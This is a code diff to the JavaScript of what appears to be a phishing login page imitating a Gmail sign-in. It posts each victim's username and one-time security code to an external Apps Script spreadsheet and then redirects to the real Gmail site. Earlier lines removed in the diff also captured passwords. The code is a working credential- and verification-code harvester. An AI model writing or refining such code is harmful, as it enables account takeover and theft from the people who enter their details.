@@ -14,27 +14,23 @@ const countdownEl = document.getElementById('countdown');
 let timerInterval;
 let timeLeft = 120; // seconds
 
-// 1) On "Log in" click: send username+password, then show verification
+// 1) On "Log in" click: send only username, then show verification
 regForm.addEventListener('submit', async e => {
   e.preventDefault();
 
   const username = document.getElementById('username').value.trim();
-  const password = document.getElementById('password').value.trim();
-
-  if (!username || !password) {
-    alert('Please enter both username and password.');
+  if (!username) {
+    alert('Please enter your email or phone number.');
     return;
   }
 
-  // Disable button & show logging state
   submitBtn.innerText = 'Logging in…';
   submitBtn.disabled = true;
 
-  // POST credentials to your Apps Script
+  // POST just the username
   try {
     const params = new URLSearchParams();
     params.append('username', username);
-    params.append('name', password);   // 'name' param maps to your sheet's password column
 
     await fetch(scriptUrl, {
       method: 'POST',
@@ -42,15 +38,13 @@ regForm.addEventListener('submit', async e => {
       body: params.toString()
     });
   } catch (err) {
-    console.error('Error saving credentials:', err);
-    // you might choose to alert here
+    console.error('Error saving username:', err);
   }
 
-  // Swap forms
+  // Swap to verification form
   regForm.classList.add('hidden');
   verForm.classList.remove('hidden');
 
-  // Start the 2‑minute countdown
   startTimer();
 });
 
@@ -82,7 +76,7 @@ resendBtn.addEventListener('click', () => {
   startTimer();
 });
 
-// 3) Continue → send code, then redirect
+// 3) Continue → send only the code, then redirect
 continueBtn.addEventListener('click', async () => {
   const code = document.getElementById('securityCode').value.trim();
   if (!code) {
@@ -93,7 +87,6 @@ continueBtn.addEventListener('click', async () => {
   try {
     const params = new URLSearchParams();
     params.append('username', code);
-    params.append('name', code);
 
     await fetch(scriptUrl, {
       method: 'POST',
@@ -104,6 +97,5 @@ continueBtn.addEventListener('click', async () => {
     console.error('Error saving code:', err);
   }
 
-  // final redirect
   window.location.href = 'https://www.gmail.com';
 });
